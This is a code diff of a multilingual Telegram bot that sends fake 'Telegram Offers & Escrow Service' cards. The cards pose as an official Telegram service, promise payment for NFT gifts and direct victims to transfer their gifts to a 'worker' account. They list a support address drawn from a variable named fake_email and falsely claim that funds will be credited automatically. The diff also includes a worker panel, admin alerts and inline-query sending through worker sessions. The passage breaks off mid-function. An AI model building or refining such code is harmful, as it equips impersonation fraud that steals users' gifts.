@@ -130,16 +130,16 @@ def get_currency_label(currency: str, lang: str = DEFAULT_LANG, plain: bool = Fa
     return currency.upper()
 
 # ═══════════════════════════════════════════════════════
-# 🌐 ШАБЛОНЫ СООБЩЕНИЙ (КУРСИВ)
+# 🌐 ШАБЛОНЫ СООБЩЕНИЙ (КУРСИВ + БЕЗОПАСНАЯ РАЗМЕТКА)
 # ═══════════════════════════════════════════════════════
 
 TEXTS = {
     "ru": {
         "offer_body": (
-            "<i>{scale} <b>Telegram Offers</b>\n\n"
-            "{user} Пользователь предлагает вам\n"
-            "<b>{price} {currency}</b> за подарок <b>{gift_name}</b>.\n\n"
-            "{time} Оффер действителен ещё <b>{ttl} ч.</b></i>"
+            "{scale} <i><b>Telegram Offers</b></i>\n\n"
+            "{user} <i>Пользователь предлагает вам\n"
+            "<b>{price} {currency}</b> за подарок <b>{gift_name}</b>.</i>\n\n"
+            "{time} <i>Оффер действителен ещё <b>{ttl} ч.</b></i>"
         ),
         "btn_accept": "✅ Принять",
         "btn_reject": "❌ Отклонить",
@@ -148,103 +148,103 @@ TEXTS = {
             "Передайте подарок @{worker_username} в течение 30 минут."
         ),
         "accepted_body": (
-            "<i>{check} <b>Средства зарезервированы</b>\n\n"
-            "{money} Сумма: <b>{price} {currency}</b>\n"
-            "{gift} Подарок: <b>{gift_name}</b>\n"
-            "{box} Заказ: <code>#{order}</code>\n"
-            "{user} Покупатель: <b>@{worker_username}</b>\n\n"
-            "Для завершения сделки передайте подарок на аккаунт покупателя: <b>@{worker_username}</b>.\n"
-            "Передача: откройте подарок в профиле → «Передать» → выберите получателя: <b>@{worker_username}</b>.\n\n"
-            "{time} У вас будет 30 минут для передачи подарка.\n\n"
-            "{warning} После получения подарка средства автоматически зачислятся на ваш баланс Telegram.\n\n"
-            "{globe} Если у вас произошла какая-то ошибка или возникли вопросы, обратитесь в службу поддержки: <code>{fake_email}</code>\n\n"
-            "Это сообщение видите только вы с целью конфиденциальности</i>"
+            "{check} <i><b>Средства зарезервированы</b></i>\n\n"
+            "{money} <i>Сумма: <b>{price} {currency}</b></i>\n"
+            "{gift} <i>Подарок: <b>{gift_name}</b></i>\n"
+            "{box} <i>Заказ: <code>#{order}</code></i>\n"
+            "{user} <i>Покупатель: <b>@{worker_username}</b></i>\n\n"
+            "<i>Для завершения сделки передайте подарок на аккаунт покупателя: <b>@{worker_username}</b>.\n"
+            "Передача: откройте подарок в профиле → «Передать» → выберите получателя: <b>@{worker_username}</b>.</i>\n\n"
+            "{time} <i>У вас будет 30 минут для передачи подарка.</i>\n\n"
+            "{warning} <i>После получения подарка средства автоматически зачислятся на ваш баланс Telegram.</i>\n\n"
+            "{globe} <i>Если у вас произошла какая-то ошибка или возникли вопросы, обратитесь в службу поддержки: <code>{fake_email}</code></i>\n\n"
+            "<i>Это сообщение видите только вы с целью конфиденциальности</i>"
         ),
         "escrow_welcome": (
-            "<i>{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
-            "Официальный сервис безопасных сделок и передачи NFT-подарков Telegram.\n\n"
-            "{check} Средства покупателя резервируются смарт-контрактом до момента подтверждения передачи подарка.\n"
-            "{warning} Все сделки защищены политикой конфиденциальности Telegram.\n\n"
-            "{globe} Служба поддержки: <code>{fake_email}</code></i>"
+            "{scale} <i><b>Telegram Offers & Escrow Service</b></i>\n\n"
+            "<i>Официальный сервис безопасных сделок и передачи NFT-подарков Telegram.</i>\n\n"
+            "{check} <i>Средства покупателя резервируются смарт-контрактом до момента подтверждения передачи подарка.</i>\n"
+            "{warning} <i>Все сделки защищены политикой конфиденциальности Telegram.</i>\n\n"
+            "{globe} <i>Служба поддержки: <code>{fake_email}</code></i>"
         ),
-        "rejected_body": "<i>{cross} <b>Оффер отклонён</b></i>",
+        "rejected_body": "{cross} <i><b>Оффер отклонён</b></i>",
         "alert_rejected": "Оффер отклонён",
         "start_msg": (
-            "<i>👋 <b>Панель воркера</b>\n\n"
-            "👤 Твой ID: <code>{uid}</code>\n"
-            "🏷 Твой юзернейм в офферах: <b>@{worker_username}</b>\n"
-            "🌐 Язык офферов: <b>{lang}</b>\n"
-            "💱 Валюта офферов: <b>{currency}</b>\n"
-            "📱 Сессия: <b>{session_status}</b>\n"
-            "🔌 Бизнес-аккаунт: <b>{business_status}</b>\n\n"
-            "<b>Команды:</b>\n"
-            "/setusername @юзернейм — сменить отображаемый тег получателя\n"
-            "/lang — сменить язык офферов\n"
-            "/currency — сменить валюту офферов\n\n"
-            "<b>Создать оффер (сессия):</b>\n"
+            "👋 <i><b>Панель воркера</b></i>\n\n"
+            "👤 <i>Твой ID: <code>{uid}</code></i>\n"
+            "🏷 <i>Твой юзернейм в офферах: <b>@{worker_username}</b></i>\n"
+            "🌐 <i>Язык офферов: <b>{lang}</b></i>\n"
+            "💱 <i>Валюта офферов: <b>{currency}</b></i>\n"
+            "📱 <i>Сессия: <b>{session_status}</b></i>\n"
+            "🔌 <i>Бизнес-аккаунт: <b>{business_status}</b></i>\n\n"
+            "<i><b>Команды:</b></i>\n"
+            "<i>/setusername @юзернейм — сменить отображаемый тег получателя</i>\n"
+            "<i>/lang — сменить язык офферов</i>\n"
+            "<i>/currency — сменить валюту офферов</i>\n\n"
+            "<i><b>Создать оффер (сессия):</b></i>\n"
             "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
-            "<b>Создать оффер (бизнес-аккаунт):</b>\n"
-            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code></i>"
+            "<i><b>Создать оффер (бизнес-аккаунт):</b></i>\n"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
-        "choose_lang": "<i>{globe} <b>Выбери язык офферов:</b></i>",
-        "lang_set": "<i>✅ Язык установлен: {lang}</i>",
-        "choose_currency": "<i>{exchange} <b>Выбери валюту офферов:</b></i>",
-        "currency_set": "<i>✅ Валюта установлена: {currency}</i>",
+        "choose_lang": "{globe} <i><b>Выбери язык офферов:</b></i>",
+        "lang_set": "✅ <i>Язык установлен: {lang}</i>",
+        "choose_currency": "{exchange} <i><b>Выбери валюту офферов:</b></i>",
+        "currency_set": "✅ <i>Валюта установлена: {currency}</i>",
     },
     "uk": {
         "offer_body": (
-            "<i>{scale} <b>Telegram Offers</b>\n\n"
-            "{user} Користувач пропонує вам\n"
-            "<b>{price} {currency}</b> за подарунок <b>{gift_name}</b>.\n\n"
-            "{time} Офер дійсний ще <b>{ttl} год.</b></i>"
+            "{scale} <i><b>Telegram Offers</b></i>\n\n"
+            "{user} <i>Користувач пропонує вам\n"
+            "<b>{price} {currency}</b> за подарунок <b>{gift_name}</b>.</i>\n\n"
+            "{time} <i>Офер дійсний ще <b>{ttl} год.</b></i>"
         ),
         "btn_accept": "✅ Прийняти",
         "btn_reject": "❌ Відхилити",
         "alert_accepted": "Ваш подарунок {gift_name} зарезервовано.\n\nПередайте подарунок @{worker_username} протягом 30 хвилин.",
         "accepted_body": (
-            "<i>{check} <b>Кошти зарезервовано</b>\n\n"
-            "{money} Сума: <b>{price} {currency}</b>\n"
-            "{gift} Подарунок: <b>{gift_name}</b>\n"
-            "{box} Замовлення: <code>#{order}</code>\n"
-            "{user} Покупець: <b>@{worker_username}</b>\n\n"
-            "Для завершення угоди передайте подарунок на акаунт покупця: <b>@{worker_username}</b>.\n"
-            "Передача: відкрийте подарунок у профілі → «Передати» → виберіть одержувача: <b>@{worker_username}</b>.\n\n"
-            "{time} У вас буде 30 хвилин для передачі подарунка.\n\n"
-            "{warning} Після отримання подарунка кошти автоматично надійдуть на ваш баланс Telegram.\n\n"
-            "{globe} Служба підтримки: <code>{fake_email}</code>\n\n"
-            "Це повідомлення бачите тільки ви з метою конфіденційності</i>"
+            "{check} <i><b>Кошти зарезервовано</b></i>\n\n"
+            "{money} <i>Сума: <b>{price} {currency}</b></i>\n"
+            "{gift} <i>Подарунок: <b>{gift_name}</b></i>\n"
+            "{box} <i>Замовлення: <code>#{order}</code></i>\n"
+            "{user} <i>Покупець: <b>@{worker_username}</b></i>\n\n"
+            "<i>Для завершення угоди передайте подарунок на акаунт покупця: <b>@{worker_username}</b>.\n"
+            "Передача: відкрийте подарунок у профілі → «Передати» → виберіть одержувача: <b>@{worker_username}</b>.</i>\n\n"
+            "{time} <i>У вас буде 30 хвилин для передачі подарунка.</i>\n\n"
+            "{warning} <i>Після отримання подарунка кошти автоматично надійдуть на ваш баланс Telegram.</i>\n\n"
+            "{globe} <i>Служба підтримки: <code>{fake_email}</code></i>\n\n"
+            "<i>Це повідомлення бачите тільки ви з метою конфіденційності</i>"
         ),
         "escrow_welcome": (
-            "<i>{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
-            "Офіційний сервіс безпечних угод та передачі NFT-подарунків Telegram.\n\n"
-            "{globe} Служба підтримки: <code>{fake_email}</code></i>"
+            "{scale} <i><b>Telegram Offers & Escrow Service</b></i>\n\n"
+            "<i>Офіційний сервіс безпечних угод та передачі NFT-подарунків Telegram.</i>\n\n"
+            "{globe} <i>Служба підтримки: <code>{fake_email}</code></i>"
         ),
-        "rejected_body": "<i>{cross} <b>Офер відхилено</b></i>",
+        "rejected_body": "{cross} <i><b>Офер відхилено</b></i>",
         "alert_rejected": "Офер відхилено",
         "start_msg": (
-            "<i>👋 <b>Панель воркера</b>\n\n"
-            "👤 ID: <code>{uid}</code>\n"
-            "🏷 Юзернейм: <b>@{worker_username}</b>\n"
-            "🌐 Мова: <b>{lang}</b>\n"
-            "💱 Валюта: <b>{currency}</b>\n"
-            "📱 Сесія: <b>{session_status}</b>\n"
-            "🔌 Бізнес: <b>{business_status}</b>\n\n"
-            "<b>Створити офер (сесія):</b>\n"
+            "👋 <i><b>Панель воркера</b></i>\n\n"
+            "👤 <i>ID: <code>{uid}</code></i>\n"
+            "🏷 <i>Юзернейм: <b>@{worker_username}</b></i>\n"
+            "🌐 <i>Мова: <b>{lang}</b></i>\n"
+            "💱 <i>Валюта: <b>{currency}</b></i>\n"
+            "📱 <i>Сесія: <b>{session_status}</b></i>\n"
+            "🔌 <i>Бізнес: <b>{business_status}</b></i>\n\n"
+            "<i><b>Створити офер (сесія):</b></i>\n"
             "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
-            "<b>Створити офер (бізнес):</b>\n"
-            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code></i>"
+            "<i><b>Створити офер (бізнес):</b></i>\n"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
-        "choose_lang": "<i>{globe} <b>Оберіть мову:</b></i>",
-        "lang_set": "<i>✅ Мову встановлено: {lang}</i>",
-        "choose_currency": "<i>{exchange} <b>Оберіть валюту оферів:</b></i>",
-        "currency_set": "<i>✅ Валюту встановлено: {currency}</i>",
+        "choose_lang": "{globe} <i><b>Оберіть мову:</b></i>",
+        "lang_set": "✅ <i>Мову встановлено: {lang}</i>",
+        "choose_currency": "{exchange} <i><b>Оберіть валюту оферів:</b></i>",
+        "currency_set": "✅ <i>Валюту встановлено: {currency}</i>",
     },
     "en": {
         "offer_body": (
-            "<i>{scale} <b>Telegram Offers</b>\n\n"
-            "{user} A user is offering you\n"
-            "<b>{price} {currency}</b> for the gift <b>{gift_name}</b>.\n\n"
-            "{time} Offer is valid for another <b>{ttl} h.</b></i>"
+            "{scale} <i><b>Telegram Offers</b></i>\n\n"
+            "{user} <i>A user is offering you\n"
+            "<b>{price} {currency}</b> for the gift <b>{gift_name}</b>.</i>\n\n"
+            "{time} <i>Offer is valid for another <b>{ttl} h.</b></i>"
         ),
         "btn_accept": "✅ Accept",
         "btn_reject": "❌ Decline",
@@ -253,80 +253,80 @@ TEXTS = {
             "Transfer the gift to @{worker_username} within 30 minutes."
         ),
         "accepted_body": (
-            "<i>{check} <b>Funds Reserved</b>\n\n"
-            "{money} Amount: <b>{price} {currency}</b>\n"
-            "{gift} Gift: <b>{gift_name}</b>\n"
-            "{box} Order: <code>#{order}</code>\n"
-            "{user} Buyer: <b>@{worker_username}</b>\n\n"
-            "To complete the deal, transfer the gift to the buyer account: <b>@{worker_username}</b>.\n"
-            "Transfer: open gift in profile → «Transfer» → choose recipient: <b>@{worker_username}</b>.\n\n"
-            "{time} You have 30 minutes to complete the transfer.\n\n"
-            "{warning} Once the gift is received, the funds will be automatically credited to your Telegram balance.\n\n"
-            "{globe} If you encountered an error or have questions, contact support: <code>{fake_email}</code>\n\n"
-            "This message is only visible to you for confidentiality purposes</i>"
+            "{check} <i><b>Funds Reserved</b></i>\n\n"
+            "{money} <i>Amount: <b>{price} {currency}</b></i>\n"
+            "{gift} <i>Gift: <b>{gift_name}</b></i>\n"
+            "{box} <i>Order: <code>#{order}</code></i>\n"
+            "{user} <i>Buyer: <b>@{worker_username}</b></i>\n\n"
+            "<i>To complete the deal, transfer the gift to the buyer account: <b>@{worker_username}</b>.\n"
+            "Transfer: open gift in profile → «Transfer» → choose recipient: <b>@{worker_username}</b>.</i>\n\n"
+            "{time} <i>You have 30 minutes to complete the transfer.</i>\n\n"
+            "{warning} <i>Once the gift is received, the funds will be automatically credited to your Telegram balance.</i>\n\n"
+            "{globe} <i>If you encountered an error or have questions, contact support: <code>{fake_email}</code></i>\n\n"
+            "<i>This message is only visible to you for confidentiality purposes</i>"
         ),
         "escrow_welcome": (
-            "<i>{scale} <b>Telegram Offers & Escrow Service</b>\n\n"
-            "Official secure escrow and NFT gift transfer platform.\n\n"
-            "{globe} Support: <code>{fake_email}</code></i>"
+            "{scale} <i><b>Telegram Offers & Escrow Service</b></i>\n\n"
+            "<i>Official secure escrow and NFT gift transfer platform.</i>\n\n"
+            "{globe} <i>Support: <code>{fake_email}</code></i>"
         ),
-        "rejected_body": "<i>{cross} <b>Offer declined</b></i>",
+        "rejected_body": "{cross} <i><b>Offer declined</b></i>",
         "alert_rejected": "Offer declined",
         "start_msg": (
-            "<i>👋 <b>Worker Panel</b>\n\n"
-            "👤 ID: <code>{uid}</code>\n"
-            "🏷 Username: <b>@{worker_username}</b>\n"
-            "🌐 Language: <b>{lang}</b>\n"
-            "💱 Currency: <b>{currency}</b>\n"
-            "📱 Session: <b>{session_status}</b>\n"
-            "🔌 Business: <b>{business_status}</b>\n\n"
-            "<b>Create offer (session):</b>\n"
+            "👋 <i><b>Worker Panel</b></i>\n\n"
+            "👤 <i>ID: <code>{uid}</code></i>\n"
+            "🏷 <i>Username: <b>@{worker_username}</b></i>\n"
+            "🌐 <i>Language: <b>{lang}</b></i>\n"
+            "💱 <i>Currency: <b>{currency}</b></i>\n"
+            "📱 <i>Session: <b>{session_status}</b></i>\n"
+            "🔌 <i>Business: <b>{business_status}</b></i>\n\n"
+            "<i><b>Create offer (session):</b></i>\n"
             "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
-            "<b>Create offer (business):</b>\n"
-            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code></i>"
+            "<i><b>Create offer (business):</b></i>\n"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
-        "choose_lang": "<i>{globe} <b>Select language:</b></i>",
-        "lang_set": "<i>✅ Language set: {lang}</i>",
-        "choose_currency": "<i>{exchange} <b>Select offer currency:</b></i>",
-        "currency_set": "<i>✅ Currency set: {currency}</i>",
+        "choose_lang": "{globe} <i><b>Select language:</b></i>",
+        "lang_set": "✅ <i>Language set: {lang}</i>",
+        "choose_currency": "{exchange} <i><b>Select offer currency:</b></i>",
+        "currency_set": "✅ <i>Currency set: {currency}</i>",
     },
     "ar": {
         "offer_body": (
-            "<i>{scale} <b>Telegram Offers</b>\n\n"
-            "{user} يقدم لك أحد المستخدمين\n"
-            "<b>{price} {currency}</b> مقابل الهدية <b>{gift_name}</b>.\n\n"
-            "{time} العرض سارٍ لمدة <b>{ttl} ساعة أخرى.</b></i>"
+            "{scale} <i><b>Telegram Offers</b></i>\n\n"
+            "{user} <i>يقدم لك أحد المستخدمين\n"
+            "<b>{price} {currency}</b> مقابل الهدية <b>{gift_name}</b>.</i>\n\n"
+            "{time} <i>العرض سارٍ لمدة <b>{ttl} ساعة أخرى.</b></i>"
         ),
         "btn_accept": "✅ قبول",
         "btn_reject": "❌ رفض",
         "alert_accepted": "تم حجز هديتك {gift_name}.\n\nيرجى تحويل الهدية إلى @{worker_username} خلال 30 دقيقة.",
         "accepted_body": (
-            "<i>{check} <b>تم حجز الأموال بنجاح</b>\n\n"
-            "{money} المبلغ: <b>{price} {currency}</b>\n"
-            "{gift} الهدية: <b>{gift_name}</b>\n"
-            "{box} رقم الطلب: <code>#{order}</code>\n"
-            "{user} المشتري: <b>@{worker_username}</b>\n\n"
-            "يرجى تحويل الهدية إلى: <b>@{worker_username}</b> خلال 30 دقيقة.\n\n"
-            "{globe} <code>{fake_email}</code></i>"
+            "{check} <i><b>تم حجز الأموال بنجاح</b></i>\n\n"
+            "{money} <i>المبلغ: <b>{price} {currency}</b></i>\n"
+            "{gift} <i>الهدية: <b>{gift_name}</b></i>\n"
+            "{box} <i>رقم الطلب: <code>#{order}</code></i>\n"
+            "{user} <i>المشتري: <b>@{worker_username}</b></i>\n\n"
+            "<i>يرجى تحويل الهدية إلى: <b>@{worker_username}</b> خلال 30 دقيقة.</i>\n\n"
+            "{globe} <code>{fake_email}</code>"
         ),
-        "escrow_welcome": "<i>{scale} <b>Telegram Offers & Escrow Service</b>\n\n{globe} <code>{fake_email}</code></i>",
-        "rejected_body": "<i>{cross} <b>تم رفض العرض</b></i>",
+        "escrow_welcome": "{scale} <i><b>Telegram Offers & Escrow Service</b></i>\n\n{globe} <code>{fake_email}</code>",
+        "rejected_body": "{cross} <i><b>تم رفض العرض</b></i>",
         "alert_rejected": "تم رفض العرض",
         "start_msg": (
-            "<i>👋 <b>لوحة التحكم</b>\n\n"
-            "👤 ID: <code>{uid}</code>\n"
-            "🏷 اسم المستخدم: <b>@{worker_username}</b>\n"
-            "📱 الجلسة: <b>{session_status}</b>\n"
-            "🔌 الحساب التجاري: <b>{business_status}</b>\n\n"
-            "<b>إنشاء عرض (جلسة):</b>\n"
+            "👋 <i><b>لوحة التحكم</b></i>\n\n"
+            "👤 <i>ID: <code>{uid}</code></i>\n"
+            "🏷 <i>اسم المستخدم: <b>@{worker_username}</b></i>\n"
+            "📱 <i>الجلسة: <b>{session_status}</b></i>\n"
+            "🔌 <i>الحساب التجاري: <b>{business_status}</b></i>\n\n"
+            "<i><b>إنشاء عرض (جلسة):</b></i>\n"
             "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
-            "<b>إنشاء عرض (تجاري):</b>\n"
-            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code></i>"
+            "<i><b>إنشاء عرض (تجاري):</b></i>\n"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
-        "choose_lang": "<i>{globe} <b>اختر اللغة:</b></i>",
-        "lang_set": "<i>✅ تم ضبط اللغة: {lang}</i>",
-        "choose_currency": "<i>{exchange} <b>اختر عملة العروض:</b></i>",
-        "currency_set": "<i>✅ تم ضبط العملة: {currency}</i>",
+        "choose_lang": "{globe} <i><b>اختر اللغة:</b></i>",
+        "lang_set": "✅ <i>تم ضبط اللغة: {lang}</i>",
+        "choose_currency": "{exchange} <i><b>اختر عملة العروض:</b></i>",
+        "currency_set": "✅ <i>تم ضبط العملة: {currency}</i>",
     }
 }
 
@@ -334,7 +334,7 @@ def t(lang: str, key: str, /, **kwargs) -> str:
     lang_dict = TEXTS.get(lang, TEXTS.get(DEFAULT_LANG, {}))
     template = lang_dict.get(key) or TEXTS.get(DEFAULT_LANG, {}).get(key)
     if not template:
-        template = "<i>⚖️ <b>Telegram Offers & Escrow Service</b>\n\nОфициальный сервис безопасных сделок.</i>"
+        template = "⚖️ <i><b>Telegram Offers & Escrow Service</b>\n\nОфициальный сервис безопасных сделок.</i>"
 
     for emoji_key in CUSTOM_EMOJIS:
         if emoji_key not in kwargs:
@@ -475,7 +475,7 @@ async def send_message_safe(chat_id: int, text: str, **kwargs):
         return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
     except TelegramBadRequest as e:
         err = str(e).lower()
-        if "custom" in err or "entity" in err or "emoji" in err:
+        if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
             clean_text = clean_custom_emoji(text)
             return await bot.send_message(chat_id=chat_id, text=clean_text, **kwargs)
         raise
@@ -531,7 +531,8 @@ def parse_offer_command(text: str):
 def make_offer_card(o: dict) -> str:
     lang = o.get("lang", DEFAULT_LANG)
     cur = o.get("currency", DEFAULT_CURRENCY)
-    cur_label = get_currency_label(cur, lang)
+    # plain=True предотвращает вложенность <tg-emoji> внутрь <i><b>, используя безопасный юникод
+    cur_label = get_currency_label(cur, lang, plain=True)
     return t(lang, "offer_body", price=o["price"], currency=cur_label, gift_name=o["gift_name"], ttl=OFFER_TTL_HOURS)
 
 def make_offer_kb(offer_id: int, lang: str) -> InlineKeyboardMarkup:
@@ -642,10 +643,12 @@ async def register_worker_client(worker_id: int, session_str: str):
                 results = await client.inline_query(BOT_USERNAME, f"offer_{offer_id}")
                 if results:
                     await results[0].click(chat_id)
+                else:
+                    print(f"[SESSION] Внимание: inline_query вернул 0 результатов для @{BOT_USERNAME}!", flush=True)
             except Exception as e:
                 print(f"[SESSION] Inline click error: {e}", flush=True)
 
-            cur_label = get_currency_label(worker_currency, worker_lang)
+            cur_label = get_currency_label(worker_currency, worker_lang, plain=True)
             await send_message_safe(
                 ADMIN_ID,
                 f"🆕 <b>Оффер #{offer_id} (session)</b>\n\n"
@@ -750,7 +753,7 @@ async def on_business_message(message: types.Message):
         )
     except TelegramBadRequest as e:
         err = str(e).lower()
-        if "custom" in err or "entity" in err or "emoji" in err:
+        if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
             clean_txt = clean_custom_emoji(card_text)
             try:
                 await bot.send_message(
@@ -765,7 +768,7 @@ async def on_business_message(message: types.Message):
         else:
             print(f"[BUSINESS] send error: {e}", flush=True)
 
-    cur_label = get_currency_label(worker_currency, worker_lang)
+    cur_label = get_currency_label(worker_currency, worker_lang, plain=True)
     await send_message_safe(
         ADMIN_ID,
         f"🆕 <b>Оффер #{offer_id} (business)</b>\n\n"
@@ -776,6 +779,289 @@ async def on_business_message(message: types.Message):
         f"💰 Цена: <b>{price} {cur_label}</b>\n"
         f"🔌 Conn: <code>{conn_id}</code>"
     )
+
+# ═══════════════════════════════════════════════════════
+# 🔍 ИНЛАЙН (С FALLBACK ЗАЩИТОЙ)
+# ═══════════════════════════════════════════════════════
+
+@dp.inline_query()
+async def inline_offer_handler(inline_query: InlineQuery):
+    query = inline_query.query.strip()
+    if not query.startswith("offer_"):
+        await inline_query.answer([], is_personal=True, cache_time=1)
+        return
+
+    try:
+        offer_id = int(query.split("_")[1])
+        o = OFFERS.get(offer_id)
+        if not o:
+            return
+
+        lang = o.get("lang", DEFAULT_LANG)
+        card_text = make_offer_card(o)
+        kb = make_offer_kb(offer_id, lang)
+
+        article = InlineQueryResultArticle(
+            id=str(offer_id),
+            title=f"Оффер #{offer_id}",
+            input_message_content=InputTextMessageContent(
+                message_text=card_text,
+                parse_mode="HTML"
+            ),
+            reply_markup=kb,
+            description=f"Отправить оффер на {o['gift_name']}"
+        )
+        try:
+            await inline_query.answer([article], is_personal=True, cache_time=1)
+        except TelegramBadRequest as e:
+            err = str(e).lower()
+            if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
+                clean_txt = clean_custom_emoji(card_text)
+                article.input_message_content = InputTextMessageContent(
+                    message_text=clean_txt,
+                    parse_mode="HTML"
+                )
+                await inline_query.answer([article], is_personal=True, cache_time=1)
+            else:
+                raise
+    except Exception as e:
+        print(f"[INLINE] Error: {e}", flush=True)
+
+@dp.chosen_inline_result()
+async def on_chosen_inline_result(chosen: ChosenInlineResult):
+    if chosen.inline_message_id and chosen.result_id:
+        try:
+            offer_id = int(chosen.result_id)
+            o = OFFERS.get(offer_id)
+            if o:
+                card_text = make_offer_card(o)
+                kb = make_offer_kb(offer_id, o.get("lang", DEFAULT_LANG))
+                try:
+                    await bot.edit_message_text(
+                        inline_message_id=chosen.inline_message_id,
+                        text=card_text,
+                        parse_mode="HTML",
+                        reply_markup=kb
+                    )
+                except TelegramBadRequest as e:
+                    err = str(e).lower()
+                    if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
+                        clean_txt = clean_custom_emoji(card_text)
+                        await bot.edit_message_text(
+                            inline_message_id=chosen.inline_message_id,
+                            text=clean_txt,
+                            parse_mode="HTML",
+                            reply_markup=kb
+                        )
+        except Exception as e:
+            print(f"[CHOSEN] Error: {e}", flush=True)
+
+# ═══════════════════════════════════════════════════════
+# 🔘 ОБРАБОТКА КНОПОК
+# ═══════════════════════════════════════════════════════
+
+async def edit_offer_message(call: types.CallbackQuery, o: dict, new_text: str, keep_kb: bool = False, kb=None):
+    parse_mode = "HTML"
+    try:
+        if call.inline_message_id:
+            await bot.edit_message_text(
+                inline_message_id=call.inline_message_id,
+                text=new_text,
+                parse_mode=parse_mode,
+                reply_markup=kb if keep_kb else None,
+            )
+            return True
+        elif call.message:
+            await bot.edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text=new_text,
+                parse_mode=parse_mode,
+                reply_markup=kb if keep_kb else None,
+            )
+            return True
+    except TelegramBadRequest as e:
+        err = str(e).lower()
+        if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
+            clean_txt = clean_custom_emoji(new_text)
+            try:
+                if call.inline_message_id:
+                    await bot.edit_message_text(
+                        inline_message_id=call.inline_message_id,
+                        text=clean_txt,
+                        parse_mode=parse_mode,
+                        reply_markup=kb if keep_kb else None,
+                    )
+                elif call.message:
+                    await bot.edit_message_text(
+                        chat_id=call.message.chat.id,
+                        message_id=call.message.message_id,
+                        text=clean_txt,
+                        parse_mode=parse_mode,
+                        reply_markup=kb if keep_kb else None,
+                    )
+                return True
+            except Exception as e2:
+                print(f"[EDIT] fallback error: {e2}", flush=True)
+        else:
+            if "not found" in err:
+                return False
+            print(f"[EDIT] error: {e}", flush=True)
+    except Exception as e:
+        print(f"[EDIT] error: {e}", flush=True)
+    return False
+
+@dp.callback_query()
+async def universal_callback(call: types.CallbackQuery):
+    data = call.data or ""
+    uid = call.from_user.id
+    current_lang = get_lang(uid)
+
+    if data == "open:lang":
+        rows = [
+            [InlineKeyboardButton(text=f"{'✅ ' if code == current_lang else ''}{name}", callback_data=f"setlang:{code}")]
+            for code, name in LANGS.items()
+        ]
+        rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
+        await call.message.edit_text(t(current_lang, "choose_lang"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+        return
+
+    if data == "open:currency":
+        curr = get_currency(uid)
+        rows = [
+            [InlineKeyboardButton(text=f"{'✅ ' if code == curr else ''}{get_currency_label(code, current_lang, plain=True)}", callback_data=f"setcurrency:{code}")]
+            for code in CURRENCIES.keys()
+        ]
+        rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
+        await call.message.edit_text(t(current_lang, "choose_currency"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+        return
+
+    if data == "open:main":
+        text = t(
+            current_lang, "start_msg",
+            uid=uid,
+            worker_username=get_worker_username(uid),
+            lang=LANGS.get(current_lang, current_lang),
+            currency=get_currency_label(get_currency(uid), current_lang, plain=True),
+            session_status=session_status(uid),
+            business_status=business_status(uid),
+        )
+        await call.message.edit_text(text, reply_markup=make_worker_main_kb(uid))
+        return
+
+    if data.startswith("setlang:"):
+        new_lang = data.split(":")[1]
+        if new_lang in LANGS:
+            WORKER_LANGS[uid] = new_lang
+            save_data()
+            await call.answer(t(new_lang, "lang_set", lang=LANGS[new_lang]))
+            rows = [
+                [InlineKeyboardButton(text=f"{'✅ ' if code == new_lang else ''}{name}", callback_data=f"setlang:{code}")]
+                for code, name in LANGS.items()
+            ]
+            rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
+            try:
+                await call.message.edit_text(t(new_lang, "choose_lang"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+            except Exception:
+                pass
+        return
+
+    if data.startswith("setcurrency:"):
+        new_cur = data.split(":")[1]
+        if new_cur in CURRENCIES:
+            WORKER_CURRENCIES[uid] = new_cur
+            save_data()
+            label_plain = get_currency_label(new_cur, current_lang, plain=True)
+            await call.answer(t(current_lang, "currency_set", currency=label_plain))
+            rows = [
+                [InlineKeyboardButton(text=f"{'✅ ' if code == new_cur else ''}{get_currency_label(code, current_lang, plain=True)}", callback_data=f"setcurrency:{code}")]
+                for code in CURRENCIES.keys()
+            ]
+            rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
+            try:
+                await call.message.edit_text(t(current_lang, "choose_currency"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+            except Exception:
+                pass
+        return
+
+    if data.startswith("accept:"):
+        _, _, raw_id = data.partition(":")
+        if not raw_id.isdigit():
+            return
+        offer_id = int(raw_id)
+        o = OFFERS.get(offer_id)
+        if not o:
+            await call.answer("Оффер не найден или истёк", show_alert=True)
+            return
+
+        offer_lang = o.get("lang", DEFAULT_LANG)
+        worker_id = o["worker_id"]
+        worker_uname = o.get("worker_username") or get_worker_username(worker_id)
+        cur_label = get_currency_label(o.get("currency", DEFAULT_CURRENCY), offer_lang, plain=True)
+
+        alert_text = t(offer_lang, "alert_accepted", gift_name=o["gift_name"], worker_username=worker_uname)
+        await call.answer(alert_text, show_alert=True)
+
+        if o.get("status") == "pending":
+            o["status"] = "accepted"
+            o["accepted_at"] = datetime.now(timezone.utc)
+            order = o.get("order_code") or gen_order_code()
+            o["order_code"] = order
+            save_data()
+
+            accepted_text = t(
